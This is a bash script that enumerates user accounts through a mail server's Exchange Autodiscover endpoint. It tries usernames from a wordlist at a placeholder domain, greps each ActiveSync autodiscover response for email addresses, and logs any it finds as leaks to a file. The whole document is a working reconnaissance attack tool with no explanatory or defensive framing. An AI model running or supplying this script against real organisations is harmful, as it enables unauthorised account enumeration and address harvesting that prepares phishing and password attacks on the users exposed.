#!/bin/bash

URL="https://autodiscover.<example.com>/autodiscover/autodiscover.json"
DOMAIN="<example.com>"
WORDLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

echo "[*] Target: $URL"
echo "[*] Domain: $DOMAIN"
echo "[*] Wordlist: $WORDLIST"
echo

COUNT=0

while IFS= read -r USER || [[ -n "$USER" ]]; do
    ((COUNT++))
    EMAIL="${USER}@${DOMAIN}"

    echo "[*] Testing: $EMAIL"

    RESPONSE=$(curl -s --max-time 8 -w "\n[Status:%{http_code}]\n" \
               "${URL}?Protocol=ActiveSync&Email=${EMAIL}&RedirectCount=1")

    echo "$RESPONSE" | head -n 5  # Show first lines
    echo

    LEAK=$(echo "$RESPONSE" | grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}')

    if [[ -n "$LEAK" ]]; then
        echo "[+] LEAK FOUND! Input ${EMAIL} -> Returned $LEAK"
        echo "$EMAIL -> $LEAK" >> found_emails.txt
    else
        echo "[-] No leak for ${EMAIL}"
    fi

    echo "-------------------------------------------"
done < "$WORDLIST"

echo "[*] Done."
echo "[*] Results saved to found_emails.txt (if any)"
